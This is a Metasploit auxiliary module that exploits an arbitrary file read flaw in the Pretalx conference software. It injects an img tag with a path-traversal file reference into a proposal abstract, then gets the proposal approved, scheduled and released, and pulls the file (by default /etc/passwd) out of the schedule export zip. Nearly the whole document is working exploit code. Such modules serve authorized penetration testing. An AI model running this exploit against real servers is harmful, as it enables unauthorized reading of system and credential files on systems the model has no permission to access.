##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'zip'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Pretalx File Read',
        'Description' => 'This module exploits functionality in Pretalx that export conference schedule as zipped file. The Pretalx will iteratively include any file referenced by any HTML tag and does not properly check the path of the file, which can lead to arbitrary file read. The module requires crendetials that allow schedule export, schedule release and approval of proposals. Additionaly, module requires conference name and URL for media files.',
        'Author' => [
          'Stefan Schiller', # security researcher
          'msutovsky-r7' # module dev
        ],
        'License' => MSF_LICENSE,

        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
      OptString.new('MEDIA_URL', [true, 'Prepend path to file path that allows arbitrary read', '/media']),
      OptString.new('USERNAME', [true, 'Username to Pretalx backend', '']),
      OptString.new('PASSWORD', [true, 'Password to Pretalx backend', '']),
      OptString.new('CONFERENCE_NAME', [true, 'Name of conference on behalf which file read will be performed', ''])
    ])
  end

  def login
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('orga', 'login/'),
      'keep_cookies' => true
    })

    fail_with Failure::UnexpectedReply('Application might not be Pretalx') unless res&.code == 200

    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')

    fail_with Failure::NotFound('Could not find CSRF token') unless csrf_token

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('orga', 'login/'),
      'vars_post' => { 'csrfmiddlewaretoken' => csrf_token, 'login_email' => datastore['USERNAME'], 'login_password' => datastore['PASSWORD'] },
      'keep_cookies' => true
    })

    fail_with Failure::NotFound('Cannot find session token') unless res.get_cookies =~ /pretalx_csrftoken=([a-zA-Z0-9]+);/

    @pretalx_token = Regexp.last_match(1)

    return false unless res&.code == 302

    true
  end

  def get_registration_step(uri)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri),
      'keep_cookies' => true
    })

    fail_with Failure::UnexpectedReply('Failed to fetch registration step') unless res&.code == 200
    return res
  end

  def create_general_info(submit_uri)
    res = get_registration_step(submit_uri)

    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
    submission_type = res.get_hidden_inputs.dig(0, 'submission_type')
    res.get_hidden_inputs.dig(0, 'content_locale')

    fail_with Failure::NotFound('Could not find hidden inputs: creating general info') unless submit_uri && csrf_token

    @proposal_name = Rex::Text.rand_text_alphanumeric(10)

    data_post = Rex::MIME::Message.new

    data_post.add_part(csrf_token, '', '', %(form-data; name="csrfmiddlewaretoken"))
    data_post.add_part(@proposal_name, '', '', %(form-data; name="title"))
    data_post.add_part(submission_type, '', '', %(form-data; name="submission_type"))
    data_post.add_part('en', '', '', %(form-data; name="content_locale"))
    data_post.add_part(%<(<img src="#{datastore['MEDIA_URL']}//#{datastore['FILEPATH']}"/>>, '', '', %(form-data; name="abstract"))
    data_post.add_part('', '', '', %(form-data; name="description"))
    data_post.add_part('', '', '', %(form-data; name="notes"))
    data_post.add_part('', 'application/octet-stream', '', %(form-data; name="image"; filename=""))
    data_post.add_part('', '', '', %(form-data; name="additional_speaker"))

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(submit_uri),
      'data' => data_post.to_s,
      'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
    })
  end

  def create_account_info(submit_uri)
    res = get_registration_step(submit_uri)

    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')

    fail_with Failure::NotFound('Could not find hidden inputs: creating account info') unless submit_uri && csrf_token

    data_post = Rex::MIME::Message.new
    data_post.add_part(csrf_token, nil, nil, %(form-data; name="csrfmiddlewaretoken"))
    data_post.add_part(csrf_token, nil, nil, %(form-data; name="csrfmiddlewaretoken"))
    data_post.add_part(datastore['USERNAME'], '', '', %(form-data; name="login_email"))
    data_post.add_part(datastore['PASSWORD'], '', '', %(form-data; name="login_password"))
    data_post.add_part('', '', '', %(form-data; name="register_name"))
    data_post.add_part('', '', '', %(form-data; name="register_email"))
    data_post.add_part('', '', '', %(form-data; name="register_password"))
    data_post.add_part('', '', '', %(form-data; name="register_password_repeat"))

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(submit_uri),
      'data' => data_post.to_s,
      'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
    })
  end

  def create_profile_info(submit_uri)
    res = get_registration_step(submit_uri)

    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')

    fail_with Failure::NotFound('Could not found hidden inputs: creating profile info') unless submit_uri && csrf_token

    Rex::Text.rand_text_alphanumeric(16).to_s

    data_post = Rex::MIME::Message.new
    data_post.add_part(csrf_token, '', '', %(form-data; name="csrfmiddlewaretoken"))
    data_post.add_part('', 'application/octet-stream', '', %(form-data; name="avatar"; filename=""))
    data_post.add_part(Rex::Text.rand_text_alphanumeric(10), '', '', %(form-data; name="name"))
    data_post.add_part(Rex::Text.rand_text_alphanumeric(10), '', '', %(form-data; name="biography"))
    data_post.add_part(%({"availabilities":[]}), '', '', %(form-data; name="availabilities"))

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(submit_uri),
      'data' => data_post.to_s,
      'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
    })
  end

  def register_malicious_proposal
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'submit/')
    })

    fail_with Failure::UnexpectedReply('Could not get proposal submission page') unless res&.code == 302
    general_info_uri = res.headers.fetch('Location', nil)

    fail_with Failure::Unknown('Could not get general info page') unless general_info_uri

    res_general_info = create_general_info(general_info_uri)

    fail_with Failure::UnexpectedReply('Proposal submission failed on General Info step') unless res_general_info&.code == 302

    account_info_uri = res.headers.fetch('Location', nil)

    fail_with Failure::Unknown('Could not get account info page') unless account_info_uri

    res_account_info = create_account_info(account_info_uri)

    fail_with Failure::UnexpectedReply('Proposal submission failed on Account Info step') unless res_account_info&.code == 302

    profile_info_uri = res.headers.fetch('Location', nil)

    fail_with Failure::Unknown('Could not get profile info page') unless profile_info_uri

    res_profile_info = create_profile_info(profile_info_uri)

    fail_with Failure::UnexpectedReply('Proposal submission failed on Profile Info step') unless res_profile_info&.code == 302
  end

  def approve_proposal
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'submissions/')
    })

    fail_with Failure::UnexpectedReply('Could not find submissions') unless res&.code == 200

    html = res.get_html_document

    proposal_element = html.xpath('//td/a').find { |link| link.text.strip == @proposal_name }

    fail_with Failure::Unknown('Could not find proposal') unless proposal_element

    proposal_uri = proposal_element['href']

    fail_with Failure::PayloadFailed unless proposal_uri =~ %r{/orga/event/#{datastore['CONFERENCE_NAME']}/submissions/([a-zA-Z0-9]+)/}

    proposal_id = Regexp.last_match(1)

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(proposal_uri)
    })

    fail_with Failure::UnexpectedReply('Failed to get proposal approval page') unless res&.code == 200

    html = res.get_html_document

    approval_link = html.at('a[@class="dropdown-item submission-state-accepted"]')

    fail_with Failure::Unknown('Could not find approval element, user might not have sufficient permissions') unless proposal_element

    approval_uri = approval_link['href']

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(approval_uri)
    })
    fail_with Failure::UnexpectedReply unless res&.code == 200

    next_token = res.get_hidden_inputs.dig(0, 'next')
    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(approval_uri),
      'vars_post' => { 'csrfmiddlewaretoken' => csrf_token, 'next' => next_token }
    })

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'me', 'submissions', proposal_id, 'confirm')
    })

    fail_with Failure::UnexpectedReply unless res&.code == 200

    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'me', 'submissions', proposal_id, 'confirm'),
      'vars_post' => { 'csrfmiddlewaretoken' => csrf_token }
    })
  end

  def add_proposal_to_schedule
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'api', 'talks/')
    })

    fail_with Failure::UnexpectedReply unless res&.code == 200

    json_data = res.get_json_document

    proposal = json_data['results'].find { |l| l['title'] == @proposal_name }

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('api', 'events', datastore['CONFERENCE_NAME'], 'rooms/')
    })

    fail_with Failure::UnexpectedReply unless res&.code == 200
    rooms_json = res.get_json_document
    rooms_json['results'].each do |value|
      res = send_request_cgi!({
        'method' => 'GET',
        'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'api', 'availabilities', proposal['id'], value['id'])
      })
      next unless res&.code == 200

      availability_json = res.get_json_document

      availability_json['results'].each do |timeslot|
        schedule_slot = { 'room' => (value['id']).to_s, 'start' => timeslot['start'], 'duration' => 30, 'description' => '' }

        res = send_request_cgi({
          'method' => 'PATCH',
          'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'api', 'talks', "#{proposal['id']}/"),
          'data' => JSON.generate(schedule_slot),
          'headers' => { 'X-CSRFToken' => @pretalx_token }
        })
        return true if res&.code == 200
      end
    end
    false
  end

  def release_schedule
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'release')
    })

    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
    html = res.get_html_document
    version = html.at('input[@id="id_version"]')['value']

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'release'),
      'vars_post' => { 'csrfmiddlewaretoken' => csrf_token, 'version' => version, 'comment_0' => '', 'notify_speakers' => 'off' }
    })
  end

  def download_zip
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'export/')
    })

    fail_with Failure::UnexpectedReply unless res&.code == 200

    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')

    res = send_request_cgi!({
      'method' => 'POST',
      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'export', 'trigger'),
      'vars_post' => { 'csrfmiddlewaretoken' => csrf_token }
    })

    fail_with Failure::UnexpectedReply unless res&.code == 200

    res = send_request_cgi!({
      'method' => 'GET',
      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'export', 'download')
    })

    zip = Zip::File.open_buffer(res.body)
    target_entry = zip.find_entry("#{datastore['CONFERENCE_NAME']}#{datastore['MEDIA_URL']}#{datastore['FILEPATH']}")
    fail_with Failure::PayloadFailed, 'Failed to extract target file, check if export worked' unless target_entry
    return zip.read(zip.find_entry(target_entry))
  end

  def check_host(_ip)
    return Exploit::CheckCode::Unknown('Login failed, please check credentials') unless login

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('orga', 'event/'),
      'keep_cookies' => true
    })

    return Exploit::CheckCode::Detected unless res&.code == 200

    html = res.get_html_document

    version_element = Rex::Version.new(html.at('span//a')&.text)

    return Exploit::CheckCode::Appears("Detected vulnerable version #{version_element}") if version_element <= Rex::Version.new('2.3.1')

    Exploit::CheckCode::Safe("Detected version #{version_element} is not vulnerable")
  end

  def run_host(ip)
    vprint_status('Register malicious proposal')

    register_malicious_proposal

    cookie_jar.clear

    vprint_status("Logging with credentials: #{datastore['USERNAME']}/#{datastore['PASSWORD']}")
    fail_with Failure::NoAccess, 'Incorrect credentials' unless login

    vprint_status('Approving proposal')
    approve_proposal

    vprint_status("Adding #{@proposal_name} to schedule")
    add_proposal_to_schedule
    vprint_status('Releasing schedule')
    release_schedule

    vprint_status('Trying to extract target file')
    extracted_content = download_zip

    vprint_success('Extraction successful')

    loot_path = store_loot(
      "pretalx.#{datastore['FILEPATH']}",
      'text/plain',
      ip,
      extracted_content,
      "pretalx-#{datastore['FILEPATH']}.txt",
      'Pretalx'
    )
    print_status("Stored results in #{loot_path}")

    report_vuln({
      host: rhost,
      port: rport,
      name: name,
      refs: references,
      info: "Module #{fullname} successfully leaked file"
    })
  end

end
